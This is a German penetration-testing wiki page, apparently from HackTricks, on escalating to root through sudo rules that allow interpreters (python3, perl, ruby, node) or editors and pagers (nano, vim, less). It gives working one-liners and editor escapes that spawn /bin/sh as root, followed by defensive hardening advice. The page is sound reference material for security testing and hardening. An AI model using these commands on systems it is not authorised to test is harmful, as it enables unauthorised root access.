# Missbrauch von Sudo-Befehlen

{{#include ../../banners/hacktricks-training.md}}

## Von Sudo erlaubte Interpreter

Wenn `sudo -l` einem Benutzer erlaubt, einen Interpreter als root auszuführen, sollte dies als direkte code execution behandelt werden. Interpreter sind dafür ausgelegt, beliebigen Code auszuführen. Daher entspricht eine Regel, die Binärdateien wie `python3`, `perl`, `ruby`, `lua`, `node` oder ähnliche erlaubt, normalerweise der Ausführung von root-Befehlen, sofern die Argumente nicht streng eingeschränkt und validiert werden.

Üblicher Prüfungsablauf:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Andere Beispiele für Interpreter:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Der genaue Pfad ist wichtig. Wenn die sudo-Regel `/usr/bin/python3` erlaubt, verwenden Sie bei der Validierung genau diesen Pfad:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Von Sudo erlaubte Editoren

Wenn `sudo -l` einem Benutzer erlaubt, einen interaktiven Editor als root auszuführen, sollte dies als Möglichkeit zur Befehlsausführung und nicht als harmlose Berechtigung zum Bearbeiten von Dateien betrachtet werden. Editoren können häufig Shell-Befehle ausführen, beliebige Dateien lesen und schreiben oder externe Helfer aus dem Editor heraus aufrufen.

Üblicher Prüfablauf:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano-Befehlsausführung

Wenn `nano` über sudo erlaubt ist, kann die Befehlsausführung über die Editoroberfläche möglich sein:
```text
Ctrl+R
Ctrl+X
```
Geben Sie anschließend einen Befehl wie den folgenden an:
```bash
id
/bin/sh
```
Auf einigen Terminals müssen die Standard-Streams einer interaktiven Shell möglicherweise umgeleitet werden:
```bash
reset; /bin/sh 1>&0 2>&0
```
Die genaue Tastenkombination kann je nach nano-Version und Build-Optionen variieren, aber das Sicherheitsproblem ist dasselbe: Der Editor läuft als root und kann externe Befehle ausführen.

### Andere gängige Editor-Escapes

Vim-ähnliche Editoren ermöglichen die Befehlsausführung häufig über `:!`:
```text
:!/bin/sh
```
Pager wie `less` können ebenfalls die Ausführung von Shell-Befehlen ermöglichen:
```text
!/bin/sh
```
## Defensive Hinweise

- Vermeiden Sie, Interpreter oder interaktive Editoren über sudo zu gewähren.
- Bevorzugen Sie feste, root-owned Wrapper, die genau eine eng begrenzte administrative Aktion ausführen.
- Falls ein Interpreter unvermeidbar ist, beschränken Sie den exakten Script-Pfad und verhindern Sie benutzergesteuerte Argumente, beschreibbare Imports, `PYTHONPATH` sowie die unsichere Beibehaltung der Umgebung.
- Falls das Bearbeiten von Dateien erforderlich ist, beschränken Sie den exakten Dateipfad und ziehen Sie `sudoedit` mit gepatchten sudo-Versionen und strikter Behandlung der Umgebung in Betracht.
- Überprüfen Sie `SETENV`, `env_keep`, beschreibbare Arbeitsverzeichnisse, beschreibbare Modul-/Importpfade, `NOEXEC`, `use_pty` und das Logging, betrachten Sie diese jedoch nicht als vollständige Sandbox.
